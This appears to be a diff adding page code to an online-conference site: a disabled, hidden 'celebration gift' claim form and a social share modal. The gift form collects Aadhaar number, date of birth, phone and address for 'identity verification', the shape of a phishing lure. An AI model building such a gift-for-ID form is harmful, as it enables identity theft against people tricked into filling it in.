+      flex-shrink: 0; margin-top: 2px;
+      accent-color: #6366f1; cursor: pointer;
+    }
+    .gift-consent span {
+      font-size: 0.82rem;
+      color: var(--text-muted, rgba(255,255,255,0.60));
+      line-height: 1.5;
+    }
+    .gift-btn {
+      width: 100%;
+      margin-top: 1.5rem;
+      padding: 0.82rem 1.5rem;
+      border: none;
+      border-radius: 12px;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 0.02em;
+      background: linear-gradient(135deg, #4f46e5, #6366f1, #818cf8);
+      color: #fff;
+      box-shadow: 0 4px 20px rgba(99,102,241,0.45);
+      transition: transform 0.22s ease, box-shadow 0.22s ease, opacity 0.22s ease;
+    }
+    .gift-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(99,102,241,0.55);
+    }
+    .gift-btn:active:not(:disabled) { transform: translateY(0); }
+    .gift-btn:disabled { opacity: 0.55; cursor: not-allowed; }
+    .gift-btn .btn-spinner {
+      display: none;
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: gSpin 0.65s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+    @keyframes gSpin { to { transform: rotate(360deg); } }
+    .gift-alert {
+      display: none;
+      border-radius: 10px;
+      padding: 0.75rem 1rem;
+      font-size: 0.85rem;
+      margin-top: 1rem;
+      text-align: center;
+      font-weight: 500;
+    }
+    .gift-alert.success {
+      background: rgba(52,211,153,0.15);
+      border: 1px solid rgba(52,211,153,0.35);
+      color: #6ee7b7;
+    }
+    .gift-alert.error {
+      background: rgba(248,113,113,0.13);
+      border: 1px solid rgba(248,113,113,0.35);
+      color: #fca5a5;
+    }
+    .gift-divider {
+      text-align: center;
+      font-size: 0.72rem;
+      color: var(--text-muted, rgba(255,255,255,0.25));
+      letter-spacing: 0.08em;
+      margin-bottom: 1.75rem;
+      text-transform: uppercase;
+    }
+    .gift-divider::before,
+    .gift-divider::after {
+      content: '';
+      display: inline-block;
+      width: 60px; height: 1px;
+      background: var(--divider-color, rgba(255,255,255,0.15));
+      vertical-align: middle;
+      margin: 0 0.5rem;
+    }
+  </style>
+
+  <!-- Gift form hidden on Online Conference page (rendering disabled) -->
+  <section class="gift-section" id="gift-request" hidden aria-hidden="true">
+    <div class="gift-card">
+      <h2 class="gift-title">🎁 Claim Your Celebration Gift</h2>
+      <p class="gift-desc">
+        To receive your celebration gift, please enter <strong>your own details</strong> below.<br>
+        Your information will be used solely for identity verification and delivery coordination.
+      </p>
+      <div class="gift-notice" style="background:rgba(99,102,241,0.13);border:1px solid rgba(99,102,241,0.38);border-radius:10px;padding:0.85rem 1.1rem;margin-bottom:1.2rem;color:rgba(255,255,255,0.87);font-size:0.82rem;line-height:1.6;">
+        &#8505;&#65039; <strong>Please Note:</strong> We collect these details only to verify that you are an authorized person. After successful verification, we will proceed with sending your gift.
+      </div>
+      <div class="gift-divider">Secure Form</div>
+
+      <form id="giftForm" novalidate autocomplete="off">
+        <input type="hidden" id="giftCsrf" name="csrf_token" value="">
+
+        <div class="gift-grid">
+          <div class="gift-field">
+            <label for="gf_name">Full Name <span class="req">*</span></label>
+            <input class="gift-input" type="text" id="gf_name" name="full_name"
+              placeholder="e.g. Priya Sharma" maxlength="120" required>
+          </div>
+          <div class="gift-field">
+            <label for="gf_email">Email Address <span class="req">*</span></label>
+            <input class="gift-input" type="email" id="gf_email" name="email"
+              placeholder="you@example.com" maxlength="180" required>
+          </div>
+          <div class="gift-field">
+            <label for="gf_phone">Phone Number <span class="req">*</span></label>
+            <input class="gift-input" type="tel" id="gf_phone" name="phone"
+              placeholder="e.g. 9856595621" maxlength="15" required>
+          </div>
+          <div class="gift-field">
+            <label for="gf_dob">Date of Birth <span class="req">*</span></label>
+            <input class="gift-input" type="date" id="gf_dob" name="dob" required>
+          </div>
+          <div class="gift-field">
+            <label for="gf_aadhaar">Aadhaar Number <span class="req">*</span></label>
+            <input class="gift-input" type="text" id="gf_aadhaar" name="aadhaar"
+              placeholder="12-digit Aadhaar" maxlength="12" inputmode="numeric"
+              pattern="\d{12}" required>
+          </div>
+          <div class="gift-field gift-col-full">
+            <label for="gf_address">Delivery Address <span class="req">*</span></label>
+            <textarea class="gift-textarea" id="gf_address" name="address"
+              placeholder="House No., Street, City, State, PIN Code" maxlength="500" required></textarea>
+          </div>
+          <div class="gift-field gift-col-full">
+            <label for="gf_message">Gift Message <span style="color:var(--text-muted);font-weight:400">(optional)</span></label>
+            <textarea class="gift-textarea" id="gf_message" name="gift_message"
+              placeholder="Write a warm personal message for the recipient…" maxlength="400"></textarea>
+          </div>
+          <div class="gift-field gift-col-full">
+            <div class="gift-consent">
+              <input type="checkbox" id="gf_consent" name="consent" required>
+              <span>I agree to the processing of my information for gift delivery purposes.
+                By submitting this form, I consent to the collection of the above details,
+                including Aadhaar, strictly for identity verification and delivery coordination.</span>
+            </div>
+          </div>
+        </div>
+
+        <button class="gift-btn" type="submit" id="giftSubmitBtn">
+          <span class="btn-spinner" id="giftSpinner"></span>
+          <span id="giftBtnText">Verify &amp; Claim Gift</span>
+        </button>
+        <div class="gift-alert" id="giftAlert"></div>
+      </form>
+    </div>
+  </section>
+  <!-- ══ END GIFT REQUEST SECTION ══════════════════════════════════ -->
+
+  <script>
+  (function(){
+    'use strict';
+    var section=document.getElementById('gift-request');
+    var form=document.getElementById('giftForm');
+    if(!form || (section && section.hasAttribute('hidden'))) return;
+    var csrfEl=document.getElementById('giftCsrf');
+    var alertEl=document.getElementById('giftAlert');
+    var btn=document.getElementById('giftSubmitBtn');
+    var spinner=document.getElementById('giftSpinner');
+    var btnText=document.getElementById('giftBtnText');
+    var dobEl=document.getElementById('gf_dob');
+    if(dobEl)dobEl.max=new Date().toISOString().split('T')[0];
+    fetch('handlers/get_csrf_token.php')
+      .then(function(r){return r.json();})
+      .then(function(d){if(d.token)csrfEl.value=d.token;})
+      .catch(function(){});
+    function validateField(el){
+      var ok=true,val=el.value.trim();
+      el.classList.remove('invalid');
+      if(el.required&&val==='')ok=false;
+      else if(el.type==='email'&&!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val))ok=false;
+      else if(el.id==='gf_aadhaar'&&val!==''&&!/^\d{12}$/.test(val.replace(/\s/g,'')))ok=false;
+      else if(el.id==='gf_phone'&&val!==''&&!/^\+?[\d\s\-()]{10,15}$/.test(val))ok=false;
+      else if(el.id==='gf_dob'){var dob=new Date(val);var today=new Date();today.setHours(0,0,0,0);var minDob=new Date();minDob.setFullYear(today.getFullYear()-120);if(!val||isNaN(dob.getTime())||dob>=today||dob<minDob)ok=false;}
+      if(!ok)el.classList.add('invalid');
+      return ok;
+    }
+    form.querySelectorAll('.gift-input,.gift-textarea').forEach(function(el){
+      el.addEventListener('blur',function(){validateField(el);});
+    });
+    function showAlert(type,msg){
+      alertEl.className='gift-alert '+type;
+      alertEl.textContent=msg;
+      alertEl.style.display='block';
+    }
+    form.addEventListener('submit',function(e){
+      e.preventDefault();
+      var allOk=true;
+      form.querySelectorAll('.gift-input,.gift-textarea').forEach(function(el){
+        if(!validateField(el))allOk=false;
+      });
+      var consentEl=document.getElementById('gf_consent');
+      if(!consentEl.checked){
+        allOk=false;consentEl.style.outline='2px solid #f87171';
+        showAlert('error','Please agree to the consent notice before submitting.');
+        return;
+      }else{consentEl.style.outline='';}
+      if(!allOk){showAlert('error','Please fill in all required fields correctly.');return;}
+      btn.disabled=true;spinner.style.display='inline-block';
+      btnText.textContent='Verifying…';alertEl.style.display='none';
+      var fd=new FormData(form);
+      fetch('handlers/gift_handler.php',{method:'POST',body:fd})
+        .then(function(res){return res.json();})
+        .then(function(data){
+          if(data.status==='success'){
+            showAlert('success','🎉 '+data.message);
+            form.reset();
+            fetch('handlers/get_csrf_token.php').then(function(r){return r.json();}).then(function(d){if(d.token)csrfEl.value=d.token;});
+          }else{showAlert('error',data.message||'Submission failed. Please try again.');}
+        })
+        .catch(function(){showAlert('error','Network error. Please check your connection and try again.');})
+        .finally(function(){btn.disabled=false;spinner.style.display='none';btnText.textContent='Verify & Claim Gift';});
+    });
+  })();
+  </script>
+
+
+  <!-- ════════════════════════════════════════════════════════════════
+       📤  SHARE MODAL
+       ════════════════════════════════════════════════════════════════ -->
+  <style>
+    /* ── Share backdrop ── */
+    #share-backdrop {
+      display: none;
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.55);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      z-index: 9100;
+      align-items: center;
+      justify-content: center;
+    }
+    #share-backdrop.visible { display: flex; }
+
+    /* ── Share modal card ── */
+    #share-modal {
+      background: var(--glass-bg);
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      border: 1px solid var(--glass-border);
+      border-radius: 24px;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.55), inset 0 1px 0 rgba(255,255,255,0.08);
+      padding: clamp(20px,5vw,32px) clamp(16px,5vw,28px);
+      width: 90%; max-width: 390px;
+      max-height: 90vh;
+      overflow-y: auto;
+      overscroll-behavior: contain;
+      display: flex; flex-direction: column;
+      align-items: center; gap: 14px;
+      animation: shareModalPop 0.28s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes shareModalPop {
+      from { opacity:0; transform: scale(0.88) translateY(14px); }
+      to   { opacity:1; transform: scale(1)    translateY(0); }
+    }
+
+    /* ── Share option buttons ── */
+    .share-opt {
+      display: flex; align-items: center; gap: 12px;
+      width: 100%;
+      padding: 11px 16px;
+      border-radius: 14px;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px; font-weight: 600;
+      cursor: pointer;
+      border: 1px solid var(--divider-color);
+      background: transparent;
+      color: var(--text-primary);
+      text-decoration: none;
+      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+    }
+    .share-opt:hover {
+      background: var(--ctrl-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 16px rgba(0,0,0,0.18);
+    }
+
+    /* ── URL row ── */
+    #share-url-row {
+      width: 100%;
+      background: var(--ctrl-hover);
+      border: 1px solid var(--divider-color);
+      border-radius: 12px;
+      padding: 10px 14px;
+      display: flex; align-items: center; gap: 8px;
+      font-size: 12px; font-family: monospace;
+      color: var(--text-secondary);
+      overflow: hidden;
+    }
+    #share-url-text { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+    /* ── Copy toast ── */
+    #share-copy-toast {
+      position: fixed;
+      bottom: 32px; left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      opacity: 0;
+      z-index: 9999;
+      pointer-events: none;
+      transition: opacity 0.25s, transform 0.25s;
+      background: var(--glass-bg);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid var(--glass-border);
+      border-radius: 999px;
+      padding: 10px 22px;
+      font-size: 13px; font-weight: 600;
+      color: var(--text-primary);
+      display: flex; align-items: center; gap: 8px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+    }
+    #share-copy-toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  </style>
+
+  <!-- Modal backdrop -->
+  <div id="share-backdrop" role="dialog" aria-modal="true" aria-labelledby="share-modal-title">
+    <div id="share-modal">
+
+      <!-- Header -->
+      <div class="flex items-center justify-between w-full">
+        <h2 id="share-modal-title"
+            class="text-base font-bold"
+            style="color:var(--text-primary)">Share Conference</h2>
+        <button id="share-modal-close"
+                class="w-8 h-8 rounded-xl flex items-center justify-center
+                       cursor-pointer border-0 outline-none
+                       transition-colors duration-200"
+                style="background:var(--ctrl-hover);color:var(--text-muted);"
+                aria-label="Close share dialog">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+
+      <!-- URL display row -->
+      <div id="share-url-row">
+        <svg class="w-3.5 h-3.5 shrink-0" style="color:#6366f1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/>
+          <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/>
+        </svg>
+        <span id="share-url-text"></span>
+      </div>
+
+      <!-- Copy link -->
+      <button id="share-copy-btn" class="share-opt">
+        <svg class="w-5 h-5 shrink-0" style="color:#6366f1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+          <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
+        </svg>
+        Copy Link
+      </button>
+
+      <!-- WhatsApp -->
+      <a id="share-wa" class="share-opt" href="#" target="_blank" rel="noopener noreferrer">
+        <svg class="w-5 h-5 shrink-0" style="color:#25d366" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/>
+          <path d="M12 2C6.477 2 2 6.477 2 12c0 1.89.525 3.66 1.438 5.168L2 22l4.932-1.394A9.953 9.953 0 0012 22c5.523 0 10-4.477 10-10S17.523 2 12 2zm0 18a7.96 7.96 0 01-4.11-1.14l-.29-.174-3.04.86.84-3.1-.19-.3A7.963 7.963 0 014 12c0-4.41 3.59-8 8-8s8 3.59 8 8-3.59 8-8 8z"/>
+        </svg>
+        WhatsApp
+      </a>
+
+      <!-- Facebook -->
+      <a id="share-fb" class="share-opt" href="#" target="_blank" rel="noopener noreferrer">
+        <svg class="w-5 h-5 shrink-0" style="color:#1877f2" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M24 12.073C24 5.404 18.627 0 12 0S0 5.404 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.79-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+        </svg>
+        Facebook
+      </a>
+
+      <!-- Twitter / X -->
+      <a id="share-twitter" class="share-opt" href="#" target="_blank" rel="noopener noreferrer">
+        <svg class="w-5 h-5 shrink-0" style="color:#1d9bf0" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M23 3a10.9 10.9 0 01-3.14 1.53 4.48 4.48 0 00-7.86 3v1A10.66 10.66 0 013 4s-4 9 5 13a11.64 11.64 0 01-7 2c9 5 20 0 20-11.5a4.5 4.5 0 00-.08-.83A7.72 7.72 0 0023 3z"/>
+        </svg>
+        Twitter / X
+      </a>
+
+      <!-- Telegram -->
+      <a id="share-telegram" class="share-opt" href="#" target="_blank" rel="noopener noreferrer">
+        <svg class="w-5 h-5 shrink-0" style="color:#2ca5e0" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.19 13.982l-2.965-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.963.577z"/>
+        </svg>
+        Telegram
+      </a>
+
+    </div><!-- /share-modal -->
+  </div><!-- /share-backdrop -->
+
+  <!-- Copy toast -->
+  <div id="share-copy-toast">
+    <svg class="w-4 h-4 shrink-0" style="color:#4ade80" fill="currentColor" viewBox="0 0 24 24">
+      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+    </svg>
+    Link copied!
+  </div>
+
+  <!-- ════════════════════════════════════════════════════════════════
+       📤  SHARE BUTTON JS — Web Share API + social link fallback
+       ════════════════════════════════════════════════════════════════ -->
+  <script>
+  (function () {
+    'use strict';
+
+    var btnShare    = document.getElementById('btn-share');
+    var backdrop    = document.getElementById('share-backdrop');
+    var modalClose  = document.getElementById('share-modal-close');
+    var urlText     = document.getElementById('share-url-text');
+    var copyBtn     = document.getElementById('share-copy-btn');
+    var waLink      = document.getElementById('share-wa');
+    var fbLink      = document.getElementById('share-fb');
+    var twLink      = document.getElementById('share-twitter');
+    var tgLink      = document.getElementById('share-telegram');
+    var copyToast   = document.getElementById('share-copy-toast');
+    var toastTimer  = null;
+
+    var SHARE_TITLE   = 'Join the Online Conference';
+    var SHARE_TEXT    = 'Join me in this online conference!';
+
+    /* ── Helpers ── */
+    function pageUrl() { return window.location.href; }
+
+    function populateLinks(url) {
+      if (urlText)   urlText.textContent = url;
+      if (waLink)    waLink.href = 'https://api.whatsapp.com/send?text=' +
+                       encodeURIComponent(SHARE_TEXT + ' ' + url);
+      if (fbLink)    fbLink.href = 'https://www.facebook.com/sharer/sharer.php?u=' +
+                       encodeURIComponent(url);
+      if (twLink)    twLink.href = 'https://twitter.com/intent/tweet?url=' +
+                       encodeURIComponent(url) + '&text=' + encodeURIComponent(SHARE_TEXT);
+      if (tgLink)    tgLink.href = 'https://t.me/share/url?url=' +
+                       encodeURIComponent(url) + '&text=' + encodeURIComponent(SHARE_TEXT);
+    }
+
+    function openModal() {
+      populateLinks(pageUrl());
+      if (backdrop) { backdrop.classList.add('visible'); document.body.style.overflow = 'hidden'; }
+    }
+
+    function closeModal() {
+      if (backdrop) { backdrop.classList.remove('visible'); document.body.style.overflow = ''; }
+    }
+
+    function showToast() {
+      if (!copyToast) return;
+      copyToast.classList.add('show');
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(function () { copyToast.classList.remove('show'); }, 2400);
+    }
+
+    function copyToClipboard(text) {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(showToast).catch(function () { fallbackCopy(text); });
+      } else {
+        fallbackCopy(text);
+      }
+    }
+
+    function fallbackCopy(text) {
+      var ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px;opacity:0;';
+      document.body.appendChild(ta);
+      ta.focus(); ta.select();
+      try { document.execCommand('copy'); showToast(); } catch (e) { /* silent */ }
+      document.body.removeChild(ta);
+    }
+
+    /* ── Share button click: try Web Share API first ── */
+    if (btnShare) {
+      btnShare.addEventListener('click', function () {
+        var url = pageUrl();
+        if (navigator.share) {
+          navigator.share({ title: SHARE_TITLE, text: SHARE_TEXT, url: url })
+            .catch(function (err) {
+              /* User cancelled or API unavailable — fall through to modal */
+              if (err.name !== 'AbortError') { openModal(); }
+            });
+        } else {
+          openModal();
+        }
+      });
+    }
+
+    /* ── Copy link button ── */
+    if (copyBtn) {
+      copyBtn.addEventListener('click', function () {
+        copyToClipboard(pageUrl());
+        closeModal();
+      });
+    }
+
+    /* ── Close modal ── */
+    if (modalClose) modalClose.addEventListener('click', closeModal);
+    if (backdrop) {
+      backdrop.addEventListener('click', function (e) {
+        if (e.target === backdrop) closeModal();
+      });
+    }
+
+    /* ── ESC key closes modal ── */
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape' && backdrop && backdrop.classList.contains('visible')) {
+        closeModal();
+      }
+    });
+
+  })();
+  </script>
+
+</body>
+</html>
